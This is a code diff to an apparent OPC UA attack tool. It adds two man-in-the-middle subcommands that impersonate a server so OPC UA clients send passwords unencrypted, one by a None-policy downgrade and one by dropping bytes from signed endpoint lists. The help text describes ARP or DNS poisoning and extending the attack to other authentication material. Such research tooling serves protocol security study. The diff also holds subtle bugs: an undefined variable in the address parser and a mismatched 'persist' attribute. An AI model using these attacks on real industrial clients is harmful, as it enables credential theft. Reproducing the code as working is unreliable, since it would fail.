@@ -50,6 +50,22 @@ def add_padding_oracle_args(aparser : ArgumentParser):
     help='if set, will try a timing-based padding oracle with this threshold parameter (fractional; in seconds); use check -t to help determine this')
   aparser.add_argument('-C', '--timing-attack-expansion', type=int, metavar='COUNT', default=50,
     help='when used alongside -T this determines the ciphertext expansion parameter; default: 50')
+  
+def add_mitm_args(aparser : ArgumentParser):
+  """Common arguments for MitM attacks."""
+  def address_arg(arg):
+    [host, port] = args.split(':')
+    return host or '0.0.0.0', int(port)
+  
+  aparser.add_argument('-r', '--reverse-hello', type=address_arg, metavar='client-host:port',
+    help='if set, will sent a ReverseHello to connect to the client')
+  aparser.add_argument('-p', '--persists', action='store_true',
+    help='keep listening for incoming connections after starting an attack')
+  aparser.add_argument('[listen-address]:port', dest='laddress', type=address_arg,
+    help='address to bind to to listen for incoming connections; when -r is set this is instead used as an endpointUrl in the ReverseHello message')
+  aparser.add_argument('server-url', type=str,
+    help='OPC URL of a (discovery) server whose certificate the client is expected to trust')
+
     
 class CheckAttack(Attack):
   subcommand = 'check'
@@ -299,18 +315,53 @@ to show the concept in isolation or perform some follow-up attack.
     }[args.padding_oracle_type]
     forge_signature_attack(args.url, unhexlify(args.payload), opn, password, SecurityPolicy.BASIC128RSA15 if args.hash_function == 'sha1' else SecurityPolicy.BASIC256, args.timing_attack_threshold, args.timing_attack_expansion)
 
-class MitMAttack(Attack):
-  subcommand = 'mitm'
-  short_help = 'active MitM attack on an intercepted client-server connection (TODO)'
+class DowngradeMitmAttack(Attack):
+  subcommand = 'client-downgrade'
+  short_help = 'password stealing downgrade attack against a client'
   long_help = """
-TODO
+This attack can be carried out when the tool can act as a server towards an OPC UA client. This is possible when 
+when the client either supports the ReverseHello mechanism, or when a network MitM position can be obtained (via. e.g. 
+ARP or DNS poisoning).
+
+The tool simply pretends to be a server that requires a password but only supports the None policy, attempting to get
+the client to supply an unencrypted password. 
+
+The server-url is used to fetch a certificate that the client is expected to trust. No further interactions are done 
+with the server.
+
+Currently only password stealing is implemented, but the same technique could be used to extract other authentication 
+material such as tokens or signed nonces.
 """.strip()
   
   def add_arguments(self, aparser):
-    pass
+    add_mitm_args(aparser)
     
   def execute(self, args):
-    raise Exception('TODO: implement')
+    client_attack(nonegrade_mitm, args.server_url, *args.laddress, args.reverse_hello, args.persist)
+    
+class ByteDropMitmAttack(Attack):
+  subcommand = 'client-bytedrop'
+  short_help = 'password stealing downgrade attack against a client, using the byte dropping attack'
+  long_help = """
+Demonstrates the byte dropping MitM attack by modifying a signed server endpoint list such that is appears to request
+the client to supply an unencrypted password. 
+
+Takes advantage of the fact that HelloMessage parameters are unauthenticated to force the server to send signed 
+messages with a payload length of one byte. By dropping messages arbitrary byte ranges (except for the final byte) can 
+be removed from the payload.
+
+The effect is this particular attack is the same as client-downgrade, except that the client does not need to accept 
+the None security policy for connection security.
+
+Requires that the server has an endpoint list that includes a Sign endpoint, and happens to have the right structure
+to allow the right transformation via byterange dropping.
+""".strip()
+  
+  def add_arguments(self, aparser):
+    add_mitm_args(aparser)
+    
+  def execute(self, args):
+    client_attack(chunkdrop_mitm, args.server_url, *args.laddress, args.reverse_hello, args.persist)
 
 ENABLED_ATTACKS = [
   CheckAttack(),
@@ -320,7 +371,8 @@ ENABLED_ATTACKS = [
   NoAuthAttack(),
   DecryptAttack(),
   SigForgeAttack(), 
-  MitMAttack(),
+  DowngradeMitmAttack(),
+  ByteDropMitmAttack(),
 ]
 
 
